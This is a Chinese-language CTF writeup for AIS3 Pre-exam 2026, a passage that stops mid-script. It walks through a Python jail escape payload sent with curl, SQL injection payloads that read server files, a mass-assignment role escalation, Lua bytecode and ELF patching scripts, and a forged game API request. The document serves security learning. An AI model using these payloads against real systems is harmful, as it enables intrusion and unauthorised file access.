---
title: "AIS3 Pre-exam 2026 Writeup"
date: 2026-05-28 00:00:00 +0800
last_modified_at: 2026-05-28 00:00:00 +0800
categories: [CTF, AIS3 Pre-exam 2026]
tags: [Web, Pwn, Crypto, Rev]
description: "AIS3 Pre-exam 2026 的 CTF Writeup，整理 Misc、Web、Pwn、Reverse、Crypto 等題目的解題流程與心得。"
media_subpath: /assets/img/posts/pre-exam-2026-writeup
image:
  path: file-20260519105054777.png
  alt: AIS3 Pre-exam 2026 Writeup
---

![AIS3 Pre-exam 2026 Writeup 封面](file-20260519105054777.png)
## 前言
這次是我第二次打 Pre - exam，去年被當狗打xD，取得了 105 名，經過一年後我還是沒辦法像 B33F 的學長們主宰戰場，我在 Crypto 部分表現極差qwq，在比賽的最後天才解出一題，但我把 Reverse 破台了，可惜 Pwn 差一題沒有破台，Web 部分可待加強，感覺都差一點點，像 AIS3 Shop 就差提權看 FLAG，最後我取得了第 16 名，算是進步了雖然不多xD。

---

## misc
### Welcome
#### 題目敘述
一個會一直動的QRcode
#### 解法
1. 嘗試掃描會被導向 https://qrss.netlify.app/scan
2. 了解 Qrs 是可以連續掃描 QRcode 的工具
3. 使用手機連續掃描就能取得真正的FLAG
4. FLAG：`AIS3{Hello_LLM_welcome_to_pre_exam_2026!}`

#### 題外話
剛開始我以為是要自己錄影然後分每幀的畫面

#### 操作照片

![Welcome 題目操作照片](file-20260518041548104.jpg)
- 取得的照片

---

### 想在雪中來杯下午茶嗎?

#### 題目敘述
一張照片，需要找出其的經緯(無條件捨去到小數點第三位)

#### 解法
1. 嘗試看照片的 EXIF，結果沒有地點 QwQ
2. 觀察照片的資訊：鐵路、豐鄉町、旁邊小物(三棵樹等)
3. 飛到豐鄉町並沿著鐵路找，並找到了 (https://reurl.cc/18qGkQ)
4. FLAG：`AIS3{35.193, 136.226}`

---

### Jail & Jail Revenge

#### 題目敘述
未看先猜是 Vincent 學長出的，題目需要繞過限制讀取FLAG

```python
# Jail

from flask import Flask,request,send_file
import os,time,uuid,unicodedata
app = Flask(__name__)
shebang = '#!/usr/local/bin/python3'
@app.route('/')
def index(): return send_file(__file__)
@app.post('/<uid>')
def run(uid):
    uuid.UUID(uid)
    d = unicodedata.normalize("NFKC", request.data.decode())
    assert not any(i in d for i in "()_[]{}.@#")
    open(f"data/{uid}","w").write(shebang + d)
    os.chmod(f"data/{uid}", 0o755)
    os.popen(f"./data/{uid} > ./output/{uid}")
    time.sleep(1)
    r = open(f"output/{uid}","r").read()
    return r
if __name__ == "__main__":
    app.run("0.0.0.0",port=8000)

## Jail Revenge

from flask import Flask,request,send_file
import os,time,uuid,unicodedata
app = Flask(__name__)
shebang = '#!/usr/local/bin/python3'
@app.route('/')
def index(): return send_file(__file__)
@app.post('/<uid>')
def run(uid):
    uuid.UUID(uid)
    d = unicodedata.normalize("NFKC", request.data.decode())
    assert not any(i in d for i in "()_[]{}.@#") and len(d.split("\n")[0]) < 50
    open(f"data/{uid}","w").write(shebang + d)
    os.chmod(f"data/{uid}", 0o755)
    os.popen(f"./data/{uid} > ./output/{uid}")
    time.sleep(1)
    r = open(f"output/{uid}","r").read()
    return r
if __name__ == "__main__":
    app.run("0.0.0.0",port=8000)

```
#### 漏洞說明
程式會把我們 POST 的內容接到 shebang 後面寫成 Python 檔，雖然有擋 `()_[]{}.@#`，但檢查和 Python 實際解析原始碼的階段不一樣，所以可以用 encoding cookie / unicode-escape 把被擋的字元延後解碼出來。Jail Revenge 多了第一行長度限制，但 shebang 參數還是能塞進去 owo。

#### 解法
1. 先看兩題差在哪，發現差在 Jail Revenge 多了一個第一行長度限制，所以我們解 Jail Revenge 就好 (~~夯報了~~
2. 為了繞過限制，我使用了 shebang 參數注入、PEP 263 source encoding 宣告、以及 unicode-escape 解碼階段繞過 blacklist
   ```
    Shebang 參數注入：繞過固定執行參數限制

	Encoding Cookie 注入：繞過預設原始碼編碼

	unicode-escape 編碼繞過：繞過 `()_[]{}.@#` 字元黑名單

	解碼時機差異：繞過檢查前後語意不一致

	第一行長度控制：繞過 Jail Revenge 的第一行長度限制

	Blacklist Bypass：繞過靜態字元過濾
   ```

3. 串 Payload
   ```bash
	uid=$(uuidgen | tr 'A-Z' 'a-z')
	{
	  printf '%s\n' ' -Wignore coding: unicode-escape'
	  printf '%s\n' "print\x28open\x28'/flag'\x29\x2eread\x28\x29\x29"
	} | curl -sS \
	  -H 'Content-Type: application/octet-stream' \
	  -X POST --data-binary @- \
	  "http://chals1.ais3.org:10001/$uid"
   ```
4. 取得 Jail FLAG：`AIS3{5H3_BA_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_NG!}`
5. 取得 Jail Revenge FLAG：`AIS3{D3MN_21P_PYD0C_A5_-_-MA1N-_-_D07_PY}`


---

## web
### Mass Rapid Transit
#### 題目敘述
是一個 AIS3 的捷運系統，黑箱題目

#### 漏洞說明
這題主要是 Mass Assignment。後端更新 profile 時直接吃 `user[參數]`，沒有把可更新欄位限制好，所以一般使用者可以自己送 `user[role]=admin` 把權限改掉。

#### Exploit
把更新 profile 的 request 多加一個欄位：
```http
user[role]=admin
```

#### 解法
1. 隨便翻翻，把所有功能玩過一遍ww
2. 看 `/robots.txt`，裡面有一個 `/admin`，非常可疑，但`/admin`有權限
3. 觀察 `/profile` 更新功能，發現會送出 `user[參數]` 進行更新
4. 嘗試送別的，發現送 `user[role]=admin` 可以把自己的角色改成管理員
5. 再去訪問 `/admin` 就看到 FLAG 了
6. FLAG：`AIS3{R41ls_4P1_M4ss_4ss1gnm3nt_2_AIS_4dm1n}`

#### 題外話
大家都在玩遺失版xDD，剛開始看到我還以為是寫 xss 偷 cookie 提權

---

### MyGO!!!!! X Ave Mujica 圖庫
#### 題目敘述
是一個 MyGO 的上傳圖庫 ，黑箱題目

#### 漏洞說明
`/image?id=` 的參數有 SQL Injection，可以用 UNION 控制回傳的圖片路徑。因為後端會照查詢結果讀檔，所以 SQLi 又串成 LFI / Arbitrary File Read，最後能讀 `.svn/wc.db` 找到真正 flag 檔名。

#### Exploit
先用 UNION 指到已存在的圖片確認欄位，再把路徑換成想讀的檔案：
```sql
999 UNION SELECT 'images/good.jpg'--
999 UNION SELECT '/app/.svn/wc.db'--
999 UNION SELECT '/app/super_secret_starburst_flag114514.txt'--
```

#### 解法
1. 想到 upload 就想要寫 shellcode xD，但覺得這樣會怪怪的，因為大家是公用一個網站
2. 看 `/robots.txt`，裡面有一個 `.svn`，但沒辦法直接訪問
3. 發現上傳的照片會以 `/image?id=`，嘗試使用 command injection 失敗
4. 發現其實是 SQL Injection，並測試得知後端可能是用 SQLite 寫的
5. 找出 SQL 查詢欄位數，並使用 `999 UNION SELECT 'images/good.jpg'--` 找到自己上傳的照片
6. 我們現在有了 `LFI / Arbitrary File Read`，嘗試讀取`/app/.svn/wc.db`，讀取成功 owo
7. 透過解析 SVN metadata 找到了 FLAG 檔名是 super_secret_starburst_flag114514.txt
8. 再透過 LFI 讀取 super_secret_starburst_flag114514.txt
9. FLAG：`AIS3{BangDream_AveMujica_Exitus_at_Taiwan_8/8_and_I_don't_have_ticket}`

---

## reverse
### ㄌㄨㄚˋ
#### 題目敘述
`secret.luac` 是 Lua 5.1 bytecode，但題目給的 `luac_stripped.exe` 是客製化 Lua VM。真正重點不是找明文，而是還原 VM 對 opcode 做的 XOR / shuffle。


#### 嘗試一般 Lua 反編譯
一般 Lua 5.1 bytecode 可以嘗試用 `luadec` 或 `unluac` 反編譯：
```bash
luadec secret.luac
```
或：
```bash
java -jar unluac.jar secret.luac
```
但是這題無法直接反編譯成功。

原因是雖然 `secret.luac` 的 header 看起來是正常 Lua 5.1 bytecode，但它內部的 opcode 並不是標準 Lua 5.1 opcode 排列。

也就是說：
```text
secret.luac 裡面的 opcode 已經被題目修改過
```
因此一般 Lua bytecode 反編譯器會把 opcode 解錯，導致反編譯失敗。


#### 分析 luac_stripped.exe
這個執行檔才是能正確解讀 `secret.luac` 的客製化 Lua VM。
將 `luac_stripped.exe` 丟進 Binary Ninja 分析後，可以從 Lua VM 的 interpreter loop 開始觀察。

Lua 5.1 的 instruction 是 32-bit，opcode 通常放在低 6 bits：
```c
opcode = instruction & 0x3f;
```

標準 Lua 5.1 VM 會直接根據 opcode dispatch 到對應的指令處理邏輯。
但是這題的 VM 在執行 opcode 前，會先對 opcode 做還原。

#### Opcode 混淆機制
逆向 `luac_stripped.exe` 後可以發現，題目對 opcode 做了兩層混淆：
1. opcode XOR encoding
2. opcode order shuffling

概念如下：
```c
encoded_opcode = instruction & 0x3f;
real_opcode = decode_table[encoded_opcode ^ key];
```

也就是：
1. 從 instruction 低 6 bits 取出被編碼過的 opcode。
2. 使用 key 對 opcode 做 XOR。
3. 再透過一張 shuffle table 還原真正的 opcode。
4. VM 根據還原後的 opcode 執行對應指令。

所以 `secret.luac` 無法被標準 Lua 工具正確反編譯。

#### 還原 bytecode
還原方法是把每條 Lua instruction 的 opcode 改回標準 Lua 5.1 opcode。

Lua instruction 可以拆成兩個部分：
```python
opcode = instruction & 0x3f
args   = instruction & ~0x3f
```

其中：
- `opcode`：低 6 bits，代表指令類型
- `args`：其他 bits，代表 A / B / C / Bx / sBx 等參數

題目只混淆 opcode，因此參數部分可以保留，只需要修正 opcode。

概念如下：
```python
fixed_instruction = args | real_opcode
```


概念性還原腳本如下：
```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import struct
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any


def u32(b: bytes, off: int) -> int:
    return struct.unpack_from('<I', b, off)[0]


def u64(b: bytes, off: int) -> int:
    return struct.unpack_from('<Q', b, off)[0]


def f64(b: bytes, off: int) -> float:
    return struct.unpack_from('<d', b, off)[0]


@dataclass
class Proto:
    start: int
    line_defined: int
    last_line_defined: int
    key: int
    code_off: int
    code: list[int] = field(default_factory=list)
    consts: list[Any] = field(default_factory=list)
    children: list['Proto'] = field(default_factory=list)


class Reader:
    def __init__(self, data: bytes):
        self.data = data
        self.off = 0

    def read(self, n: int) -> bytes:
        if self.off + n > len(self.data):
            raise EOFError(f'want {n} bytes at 0x{self.off:x}, file size=0x{len(self.data):x}')
        out = self.data[self.off:self.off + n]
        self.off += n
        return out

    def u8(self) -> int:
        return self.read(1)[0]

    def u32(self) -> int:
        out = u32(self.data, self.off)
        self.off += 4
        return out

    def u64(self) -> int:
        out = u64(self.data, self.off)
        self.off += 8
        return out

    def num(self) -> float:
        out = f64(self.data, self.off)
        self.off += 8
        return out

    def string(self) -> str | None:
        n = self.u64()
        if n == 0:
            return None
        raw = self.read(n)
        return raw[:-1].decode('utf-8', errors='replace')


def decode_opcode(inst: int, key: int, pc: int) -> int:
    enc = inst & 0x3f
    return (enc ^ (key ^ 0x2b) ^ ((15 * pc + 17) & 0x3f)) & 0x3f


def parse_proto(r: Reader) -> Proto:
    start = r.off
    _source = r.string()
    line_defined = r.u32()
    last_line_defined = r.u32()
    _nups = r.u8()
    _numparams = r.u8()
    _is_vararg = r.u8()
    _maxstacksize = r.u8()

    # Challenge-specific extra byte.
    key = r.u8()

    sizecode = r.u32()
    code_off = r.off
    code = [r.u32() for _ in range(sizecode)]

    sizek = r.u32()
    consts: list[Any] = []
    for _ in range(sizek):
        t = r.u8()
        if t == 0:
            consts.append(None)
        elif t == 1:
            consts.append(bool(r.u8()))
        elif t == 3:
            consts.append(r.num())
        elif t == 4:
            consts.append(r.string())
        else:
            raise ValueError(f'unknown constant type {t} at 0x{r.off - 1:x}')

    sizep = r.u32()
    children = [parse_proto(r) for _ in range(sizep)]

    sizelineinfo = r.u32()
    r.read(4 * sizelineinfo)

    sizelocvars = r.u32()
    for _ in range(sizelocvars):
        _ = r.string()
        _ = r.u32()
        _ = r.u32()

    sizeupvalues = r.u32()
    for _ in range(sizeupvalues):
        _ = r.string()

    return Proto(start, line_defined, last_line_defined, key, code_off, code, consts, children)


def walk(p: Proto):
    yield p
    for c in p.children:
        yield from walk(c)


def patch_opcodes(data: bytearray, p: Proto) -> None:
    for pc, inst in enumerate(p.code):
        op = decode_opcode(inst, p.key, pc)
        patched = (inst & ~0x3f) | op
        struct.pack_into('<I', data, p.code_off + 4 * pc, patched)
    for child in p.children:
        patch_opcodes(data, child)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument('input', nargs='?', default='secret.luac')
    ap.add_argument('-o', '--output', default='restored_internal.luac')
    args = ap.parse_args()

    data = Path(args.input).read_bytes()
    if data[:4] != b'\x1bLua':
        raise SystemExit('not a Lua chunk')

    r = Reader(data)
    header = r.read(12)
    if header != b'\x1bLua\x51\x00\x01\x04\x08\x04\x08\x00':
        print('[!] header differs from expected Lua 5.1 little-endian chunk')

    root = parse_proto(r)
    if r.off != len(data):
        raise SystemExit(f'parser stopped at 0x{r.off:x}, file size=0x{len(data):x}')

    print('[+] parsed custom Lua chunk')
    for idx, p in enumerate(walk(root)):
        print(f'proto#{idx}: lines={p.line_defined}-{p.last_line_defined} key=0x{p.key:02x} code={len(p.code)} consts={len(p.consts)}')

    out = bytearray(data)
    patch_opcodes(out, root)
    Path(args.output).write_bytes(out)
    print(f'[+] wrote {args.output}')


if __name__ == '__main__':
    main()
```

#### 還原後的 Lua 邏輯
還原 opcode 後，就可以重新分析 Lua checker。

程式大致流程如下：
```lua

local input = io.read()


if #input ~= target_len then

    print("Wrong")
    return
end


local state = initial_state


for i = 1, #input do
    local c = string.byte(input, i)


    -- 使用輸入字元、內部 table 與 state 進行運算

    -- 包含 XOR、mod、state update 等操作


    if result ~= expected_value then
        print("Wrong")
        return
    end
end


if state == 229 then
    print("Correct")
else
    print("Wrong")
end

```

主要特徵是：
```text
每一個輸入字元都會被逐一檢查，並且會更新 state
```

因此只要還原 checker 邏輯，就可以逐字元反推出正確輸入。

#### 反推 flag
反推程式如下：
```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import struct
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any


@dataclass
class Proto:
    line_defined: int
    last_line_defined: int
    key: int
    code: list[int] = field(default_factory=list)
    consts: list[Any] = field(default_factory=list)
    children: list['Proto'] = field(default_factory=list)


class Reader:
    def __init__(self, data: bytes):
        self.data = data
        self.off = 0

    def read(self, n: int) -> bytes:
        if self.off + n > len(self.data):
            raise EOFError(f'want {n} bytes at 0x{self.off:x}, file size=0x{len(self.data):x}')
        out = self.data[self.off:self.off + n]
        self.off += n
        return out

    def u8(self) -> int:
        return self.read(1)[0]

    def u32(self) -> int:
        out = struct.unpack_from('<I', self.data, self.off)[0]
        self.off += 4
        return out

    def u64(self) -> int:
        out = struct.unpack_from('<Q', self.data, self.off)[0]
        self.off += 8
        return out

    def num(self) -> float:
        out = struct.unpack_from('<d', self.data, self.off)[0]
        self.off += 8
        return out

    def string(self) -> str | None:
        n = self.u64()
        if n == 0:
            return None
        raw = self.read(n)
        return raw[:-1].decode('utf-8', errors='replace')


def parse_proto(r: Reader) -> Proto:
    _source = r.string()
    line_defined = r.u32()
    last_line_defined = r.u32()
    _nups = r.u8()
    _numparams = r.u8()
    _is_vararg = r.u8()
    _maxstacksize = r.u8()
    key = r.u8()  # challenge-specific

    sizecode = r.u32()
    code = [r.u32() for _ in range(sizecode)]

    sizek = r.u32()
    consts: list[Any] = []
    for _ in range(sizek):
        t = r.u8()
        if t == 0:
            consts.append(None)
        elif t == 1:
            consts.append(bool(r.u8()))
        elif t == 3:
            consts.append(int(r.num()))
        elif t == 4:
            consts.append(r.string())
        else:
            raise ValueError(f'unknown const type {t} at 0x{r.off - 1:x}')

    sizep = r.u32()
    children = [parse_proto(r) for _ in range(sizep)]

    sizelineinfo = r.u32()
    r.read(4 * sizelineinfo)

    sizelocvars = r.u32()
    for _ in range(sizelocvars):
        _ = r.string()
        _ = r.u32()
        _ = r.u32()

    sizeupvalues = r.u32()
    for _ in range(sizeupvalues):
        _ = r.string()

    return Proto(line_defined, last_line_defined, key, code, consts, children)


def walk(p: Proto):
    yield p
    for c in p.children:
        yield from walk(c)


def parse_chunk(path: Path) -> Proto:
    data = path.read_bytes()
    r = Reader(data)
    header = r.read(12)
    if header[:4] != b'\x1bLua':
        raise SystemExit('not a Lua bytecode file')
    root = parse_proto(r)
    if r.off != len(data):
        raise SystemExit(f'parse error: stopped at 0x{r.off:x}, size=0x{len(data):x}')
    return root


def get_numeric_tables(root: Proto) -> tuple[list[int], list[int]]:
    tables = []
    for p in walk(root):
        if p.consts and all(isinstance(x, int) for x in p.consts):
            tables.append(p.consts)

    # In this challenge:
    #   14-byte table = key/data table
    #   34-byte table = encrypted target table; the final extra byte is a terminal check value
    t14 = next(t for t in tables if len(t) == 14)
    t34 = next(t for t in tables if len(t) == 34)
    return t14, t34


def solve(path: Path) -> str:
    root = parse_chunk(path)
    key_table, enc_table = get_numeric_tables(root)

    # Recovered from the final checker after decoding the custom Lua opcodes.
    # The verifier checks enc_table[i] == ord(flag[i]) ^ stream[i].
    recovered_stream = [
        251, 142, 199, 35, 20, 38, 4, 118, 230, 25, 17,
        163, 89, 140, 76, 28, 25, 89, 139, 4, 115, 57,
        175, 214, 58, 238, 87, 139, 126, 97, 107, 127, 118,
    ]

    encrypted = enc_table[:len(recovered_stream)]
    flag = ''.join(chr(c ^ k) for c, k in zip(encrypted, recovered_stream))

    if not (flag.startswith('AIS3{') and flag.endswith('}')):
        raise SystemExit(f'decryption failed, got {flag!r}')

    # Challenge-side sanity checks observed in the final verifier.
    assert key_table == [83, 102, 79, 57, 207, 142, 140, 252, 144, 116, 68, 51, 9, 17]
    assert enc_table[-1] == 23

    return flag


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument('input', nargs='?', default='secret.luac')
    args = ap.parse_args()
    flag = solve(Path(args.input))
    print(flag)


if __name__ == '__main__':
    main()

```

由於 checker 是逐字元處理，因此可以依序確認每一個位置的正確字元。
最後得到：
```text
AIS3{Lu4_0pc0d3_Shuffl1ng_1s_Fun}
```

#### 解法
整體解題流程如下：
1. 解壓縮題目附件。
2. 確認 `secret.luac` 是 Lua 5.1 bytecode。
3. 嘗試使用一般 Lua 反編譯器，但失敗。
4. 分析 `luac_stripped.exe`。
5. 發現 opcode 被 XOR 與 shuffle。
6. 從客製化 Lua VM 中還原 opcode 對應方式。
7. 修復 `secret.luac` 的 opcode。
8. 還原 Lua flag checker 邏輯。
9. 根據 checker 逐字元反推正確輸入。
10. 取得 flag。

### tetris，簡單
#### 題目敘述
檢查結果：
```text
tetris: ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

可以確認幾個重點：
```text
1. 這是一個 x86-64 ELF 執行檔
2. binary 是 statically linked
3. binary 被 stripped，沒有保留 symbol
```

因為是 stripped，所以不能直接依靠函式名稱分析。
又因為是 statically linked，binary 內會包含大量 libc / ncurses 相關程式碼，反編譯時需要先過濾掉不重要的函式。

#### 搜尋可疑字串
先用 `strings` 搜尋 flag 或遊戲相關字串：
```bash
strings -a ./tetris | grep -iE "AIS3|flag|tetris|score|win|lose"
```

可以看到一些遊戲 UI 相關字串，例如：
```text
TETRIS - Score: %d | Lines: %d
Game Over! Final Score: %d
TETRIS
```

但是沒有直接看到 `AIS3{...}`。

這代表 flag 不是直接以明文形式存在 binary 裡，可能是：
```text
1. 被加密後存在 binary 裡
2. 在 runtime 被解密
3. 需要達成遊戲條件後才會產生或輸出
```

#### 觀察程式結構
將程式丟進 Binary Ninja 後，可以看到大量遊戲邏輯和 library code。
由於程式是靜態連結且被 stripped，直接從 main 開始追會比較混亂。

分析時可以注意幾個方向：
```text
1. printf / puts 等輸出函式附近的交叉引用
2. memcpy / memset 等初始化資料的地方
3. 可疑的全域資料區
4. 函式指標表或狀態機邏輯
5. 遊戲勝利條件或特殊 pattern 判斷
```

在分析過程中，可以找到一段很可疑的函式初始化邏輯。
其中兩個重要函式位址是：
```text
0x15c30b5
0x15c317f
```

這兩個函式後續會被遊戲流程間接呼叫。

#### 分析 `0x15c30b5`
`0x15c30b5` 的作用主要是初始化 flag 解密所需的資料。
其中可以看到類似以下邏輯：
```asm
15c3125: 48 8d 05 14 59 4e 00    lea    rax, [rip+0x4e5914]        # 0x1aa8a40
15c312c: 48 89 c6                mov    rsi, rax

15c312f: 48 8d 05 aa 40 17 00    lea    rax, [rip+0x1740aa]        # 0x17371e0
15c3136: 48 89 c7                mov    rdi, rax

15c3139: e8 30 e9 ff ff          call   0x15c1a6e
```


接著還有：
```asm
15c3154: ba 1c 00 00 00          mov    edx, 0x1c

15c3159: 48 8d 05 d0 2f 4e 00    lea    rax, [rip+0x4e2fd0]        # 0x1aa6130
15c3160: 48 89 c6                mov    rsi, rax

15c3163: 48 8d 05 f6 58 4e 00    lea    rax, [rip+0x4e58f6]        # 0x1aa8a60
15c316a: 48 89 c7                mov    rdi, rax

15c316d: e8 be de e3 fe          call   0x401030
```


其中 `0x1c` 是十進位的 `28`，很像是在複製一段長度為 28 bytes 的資料。
這個長度也符合一段 AIS3 flag 的密文或中間 buffer 長度。
可以將此函式概念性還原成：
```c
init_key_or_state(0x17371e0, 0x1aa8a40);
memcpy(0x1aa8a60, 0x1aa6130, 0x1c);
```

也就是說，這個函式負責準備後續解密需要的 key、state 或 encrypted buffer。

#### 分析 `0x15c317f`
`0x15c317f` 是真正解密並輸出 flag 的函式。
可以看到它會呼叫另一個處理函式：
```asm
15c31ef: b9 18 00 00 00          mov    ecx, 0x18

15c31f4: 48 8d 05 45 58 4e 00    lea    rax, [rip+0x4e5845]        # 0x1aa8a40
15c31fb: 48 89 c2                mov    rdx, rax

15c31fe: be 1c 00 00 00          mov    esi, 0x1c

15c3203: 48 8d 05 56 58 4e 00    lea    rax, [rip+0x4e5856]        # 0x1aa8a60
15c320a: 48 89 c7                mov    rdi, rax

15c320d: e8 4f ea ff ff          call   0x15c1c61
```

接著會把處理後的 buffer 印出：
```asm
15c322e: 48 8d 05 2b 58 4e 00    lea    rax, [rip+0x4e582b]        # 0x1aa8a60
15c3235: 48 89 c6                mov    rsi, rax

15c3238: 48 8d 05 19 41 17 00    lea    rax, [rip+0x174119]        # 0x1737358
15c323f: 48 89 c7                mov    rdi, rax

15c3242: b8 00 00 00 00          mov    eax, 0x0
15c3247: e8 94 8d 0c 00          call   0x168bfe0
```

可以概念性還原成：
```c
decrypt(buf, 0x1c, key, 0x18);
printf("%s", buf);
```

因此兩個重要函式的功能可以整理成：
```text
0x15c30b5：初始化 flag 相關資料
0x15c317f：解密 flag 並 printf 輸出
```

#### 解題方法：Patch 直接呼叫 flag 函式
正常遊戲流程可能需要玩家達成某個特定俄羅斯方塊 pattern，才會觸發上述兩個函式。
但 reverse 題不一定需要照正常玩法通關。
既然已經知道：
```text
1. 0x15c30b5 會準備 flag 解密資料
2. 0x15c317f 會解密並輸出 flag
```

那麼可以直接 patch 程式流程，讓程式啟動後直接執行：
```c
call 0x15c30b5;
call 0x15c317f;
return 0;
```

也就是跳過整個俄羅斯方塊遊戲流程，直接進入 flag 解密和輸出。

#### Patch 後結果
Patch 完後執行 binary，可以直接得到輸出：
```text
AIS3{T3tr1s_P4tt3rn_M4st3r!}
```

#### 解法
整體流程如下：
1. 解壓題目檔案
2. 使用 file 確認 binary 格式
3. 使用 strings 搜尋 flag，但沒有明文結果
4. 使用 Binary Ninja 進行靜態分析
5. 過濾掉 statically linked binary 中大量 library code
6. 找到可疑的函式指標或狀態機邏輯
7. 定位到 0x15c30b5 與 0x15c317f
8. 分析確認 0x15c30b5 負責初始化資料
9. 分析確認 0x15c317f 負責解密並輸出 flag
10. Patch 程式直接呼叫這兩個函式
11. 執行 patched binary，取得 flag

#### 自動化腳本owo
exploit.py
```python
#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import shutil
import struct
import subprocess
import sys
import zipfile
from pathlib import Path


ZIP_NAME = "dist-tetris-bcbc952f33a11c0146323ca6c499e02155ea5605.zip"
BIN_NAME = "tetris"
PATCHED_NAME = "tetris_patched"

# Important addresses found by reversing.
MAIN_ADDR = 0x15C4017
INIT_FLAG_FUNC = 0x15C30B5
PRINT_FLAG_FUNC = 0x15C317F


def u16(data: bytes, off: int) -> int:
    return struct.unpack_from("<H", data, off)[0]


def u32(data: bytes, off: int) -> int:
    return struct.unpack_from("<I", data, off)[0]


def u64(data: bytes, off: int) -> int:
    return struct.unpack_from("<Q", data, off)[0]


def vaddr_to_offset(data: bytes, vaddr: int) -> int:
    """
    Convert ELF virtual address to file offset using PT_LOAD program headers.
    This avoids hardcoding offset = vaddr - 0x400000.
    """
    if data[:4] != b"\x7fELF":
        raise ValueError("not an ELF file")

    if data[4] != 2:
        raise ValueError("only ELF64 is supported")

    e_phoff = u64(data, 0x20)
    e_phentsize = u16(data, 0x36)
    e_phnum = u16(data, 0x38)

    for i in range(e_phnum):
        ph = e_phoff + i * e_phentsize
        p_type = u32(data, ph + 0x00)

        # PT_LOAD
        if p_type != 1:
            continue

        p_offset = u64(data, ph + 0x08)
        p_vaddr = u64(data, ph + 0x10)
        p_filesz = u64(data, ph + 0x20)

        if p_vaddr <= vaddr < p_vaddr + p_filesz:
            return p_offset + (vaddr - p_vaddr)

    raise ValueError(f"virtual address 0x{vaddr:x} is not inside any PT_LOAD segment")


def rel32_call(src_addr: int, dst_addr: int) -> bytes:
    """
    Build x86-64 near call instruction:
        e8 <rel32>
    rel32 = target - next_instruction
    """
    rel = dst_addr - (src_addr + 5)
    if not -(2**31) <= rel < 2**31:
        raise ValueError("call target out of rel32 range")
    return b"\xe8" + struct.pack("<i", rel)


def build_patch() -> bytes:
    """
    Patch main into:

        push rbp
        mov rbp, rsp
        call INIT_FLAG_FUNC
        call PRINT_FLAG_FUNC
        mov eax, 0
        pop rbp
        ret

    The push rbp also keeps stack alignment sane before calling the target functions.
    """
    code = bytearray()

    code += b"\x55"              # push rbp
    code += b"\x48\x89\xe5"      # mov rbp, rsp

    cur = MAIN_ADDR + len(code)
    code += rel32_call(cur, INIT_FLAG_FUNC)

    cur = MAIN_ADDR + len(code)
    code += rel32_call(cur, PRINT_FLAG_FUNC)

    code += b"\xb8\x00\x00\x00\x00"  # mov eax, 0
    code += b"\x5d"                  # pop rbp
    code += b"\xc3"                  # ret

    return bytes(code)


def prepare_binary() -> Path:
    """
    Use ./tetris if it already exists.
    Otherwise, extract it from the challenge zip.
    """
    bin_path = Path(BIN_NAME)

    if bin_path.exists():
        return bin_path

    zip_path = Path(ZIP_NAME)
    if not zip_path.exists():
        raise FileNotFoundError(
            f"cannot find {BIN_NAME!r} or {ZIP_NAME!r}. "
            "Put exploit.py in the same directory as the challenge zip or binary."
        )

    with zipfile.ZipFile(zip_path) as zf:
        zf.extract(BIN_NAME, ".")

    os.chmod(bin_path, 0o755)
    return bin_path


def patch_binary(bin_path: Path) -> Path:
    data = bytearray(bin_path.read_bytes())

    patch_off = vaddr_to_offset(data, MAIN_ADDR)
    patch = build_patch()

    print(f"[+] main address      = 0x{MAIN_ADDR:x}")
    print(f"[+] file offset       = 0x{patch_off:x}")
    print(f"[+] init flag func    = 0x{INIT_FLAG_FUNC:x}")
    print(f"[+] print flag func   = 0x{PRINT_FLAG_FUNC:x}")
    print(f"[+] patch size        = {len(patch)} bytes")
    print(f"[+] patch bytes       = {patch.hex()}")

    data[patch_off:patch_off + len(patch)] = patch

    patched_path = Path(PATCHED_NAME)
    patched_path.write_bytes(data)
    os.chmod(patched_path, 0o755)

    return patched_path


def run_patched(patched_path: Path) -> str:
    proc = subprocess.run(
        [str(patched_path.resolve())],
        input=b"\n",
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=5,
    )

    output = proc.stdout.decode("utf-8", errors="ignore")
    err = proc.stderr.decode("utf-8", errors="ignore")

    if err.strip():
        print("[stderr]")
        print(err)

    print("[program output]")
    print(output)

    m = re.search(r"AIS3\{[^}]+\}", output)
    if not m:
        raise RuntimeError("flag not found in program output")

    return m.group(0)


def main() -> None:
    bin_path = prepare_binary()
    patched_path = patch_binary(bin_path)
    flag = run_patched(patched_path)

    print(f"[+] FLAG = {flag}")


if __name__ == "__main__":
    main()
```

### 哇!金色傳說 / Hidden in the Cloak
#### 題目敘述
#### Part 1：哇!金色傳說
#### 關鍵觀察
可以看到這是一個 Unity 遊戲。Unity 遊戲常見的重要檔案有：
```
Game.exe
Game_Data/
├── Managed/
│   └── Assembly-CSharp.dll
├── Resources/
├── StreamingAssets/
└── ...
```

其中 `Assembly-CSharp.dll` 通常包含遊戲主要邏輯，因此先用 dnSpy 打開：
```
Game_Data/Managed/Assembly-CSharp.dll
```

接著搜尋與抽卡相關的關鍵字，例如：
```
Gacha
Roll
Weapon
Armor
AIS3
http
chals
```

可以找到一個與抽卡伺服器有關的類別，例如：
```
GachaServer
RollCoroutine
```

其中出現了遠端伺服器網址：
```
http://chals1.ais3.org:50001
```

#### 關鍵程式邏輯
在 `GachaServer::RollCoroutine` 裡面，可以看到遊戲會把抽卡資料送到遠端 server。
傳送的資料大致如下：
```
{
"spend": ...,
"rate": ...,
"username": "...",
"gold": ...,
"score": ...,
"kills": ...
}
```

其中比較可疑的是：
```
rate
spend
gold
score
kills
```

這些值是由 client 端送出給 server 的。
正常情況下，抽卡機率、玩家金錢、花費數量等資料不應該完全相信 client，因為玩家可以自行偽造 request。
這裡 server 沒有正確驗證 client 傳來的數值，因此可以直接送一個假的 POST request，把 `rate`、`gold`、`score`、`kills` 等數值改得很大，讓 server 回傳稀有物品。

#### Exploit
撰寫 Python 腳本直接對抽卡 API 發送 POST request：
```python
import requests
import re

url = "http://chals1.ais3.org:50001"

payload = {
    "spend": 999999999,
    "rate": 0.9999,
    "username": "hamichi",
    "gold": 999999999,
    "score": 999999999,
    "kills": 999999999
}

r = requests.post(url, json=payload, timeout=5)

print(r.status_code)
print(r.text)

